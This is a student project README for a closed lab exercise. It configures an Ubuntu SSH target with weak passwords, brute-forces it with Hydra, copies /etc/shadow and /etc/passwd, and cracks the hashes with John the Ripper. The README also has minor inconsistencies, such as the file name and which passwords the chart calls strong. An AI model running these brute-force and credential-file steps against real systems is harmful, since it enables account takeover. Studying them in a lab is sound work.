# Offensive Security Final Project
**Authors:** Ryan Noble, Nicolas Pacheco, Jay Georgeon  
**Tools:** Kali Linux, Ubuntu, VMware, Hydra, John the Ripper

---

## Network Setup
- We created a seperate VMnet with no internet access.
- Then we assigned both of our VMs to that VMnet.
- To verify we go onto our Kali machine and run the commands `ip route` and `ip a` in the terminal.

---

## Configuring our Target Ubuntu VM

First we need to enable SSH:
```bash
sudo apt install openssh-server -y
sudo systemctl enable --now ssh
```

Then we create the user accounts to test:
```bash
sudo useradd -m user1 && echo "user1:123456"    | sudo chpasswd
sudo useradd -m user2 && echo "user2:password"         | sudo chpasswd
sudo useradd -m user3 && echo "user3:qwerty123"     | sudo chpasswd
sudo useradd -m user4 && echo "user4:welcome1" | sudo chpasswd
```

---

## Hydra Online Credential Attack Using our Kali VM

Make sure our chosen password list is on the VM (rockyou.txt from class)

Next, we create a file called `user.txt` and fill it with the usernames of the accounts we just created:
```bash
echo -e "user1\nuser2\nuser3\nuser4" > users.txt
```

Then we run the attack:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://[UBUNTU_IP] -t 4 -V -o hydra_results.txt
```

---

## John the Ripper Offline Hash Cracking Using our Kali VM

Copy the password files from the Ubuntu VM to our Kali VM:
```bash
scp [user]@[UBUNTU_IP]:/etc/shadow ./shadow.txt
scp [user]@[UBUNTU_IP]:/etc/passwd ./passwd.txt
```

We then combine the previous files into a format that John the Ripper can interprate, then crack them and check what got cracked during the run:
```bash
unshadow passwd.txt shadow.txt > crackme.txt
time john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt
john --show crackme.txt
```

---

## Hash Comparison (MD5 vs SHA-512)

For each password we generate hashes using both MD5 and SHA-512:
```bash
echo -n "password123" | md5sum
echo -n "password123" | sha512sum
```

Next, we use John the Ripper on all of our MD5 hashes:
```bash
john --format=raw-md5 --wordlist=wordlist.txt md5test.txt
```

Then, we do the same but on our SHA-512 hashes:
```bash
john --format=sha512crypt --wordlist=wordlist.txt crackme.txt
```

---

## Results

We don't have any concrete results at this moment to record since we've mostly been doing testing and haven't been recording that data due to the project not being ready yet. But there will be results for the report and presentation. 

The following is the type of chart we are going to use for our results:

| Test | Tool | Account | Password | Hash | Result | Time |
|------|------|---------|----------|------|--------|------|
| 1 | Hydra | user1 | Weak | N/A | | |
| 2 | Hydra | user2 | Strong | N/A | | |
| 3 | Hydra | user3 | Weak | N/A | | |
| 4 | Hydra | user4 | Strong | N/A | | |
| 5 | John | user1 | Weak | SHA-512 | | |
| 6 | John | user2 | Strong | MD5 | | |
| 7 | John | user3 | Weak | SHA-512 | | |
| 8 | John | user4 | Strong | MD5 | | |
